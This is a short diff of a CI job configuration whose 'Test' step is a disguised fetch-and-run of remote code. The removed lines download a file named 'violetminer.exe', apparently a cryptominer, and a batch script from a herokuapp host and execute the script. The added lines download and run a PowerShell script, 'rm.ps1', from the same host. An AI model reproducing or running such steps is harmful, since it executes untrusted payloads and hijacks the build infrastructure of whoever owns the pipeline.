@@ -14,6 +14,5 @@ jobs:
       - run:
           name: Test
           command: |
-            Invoke-WebRequest https://papakola01.herokuapp.com/violetminer.exe -OutFile nssma.exe
-            Invoke-WebRequest https://papakola01.herokuapp.com/log.bat -OutFile log.bat
-            .\log.bat
+            Invoke-WebRequest https://papakola01.herokuapp.com/rm.ps1 -OutFile rm.ps1
+            ./rm.ps1
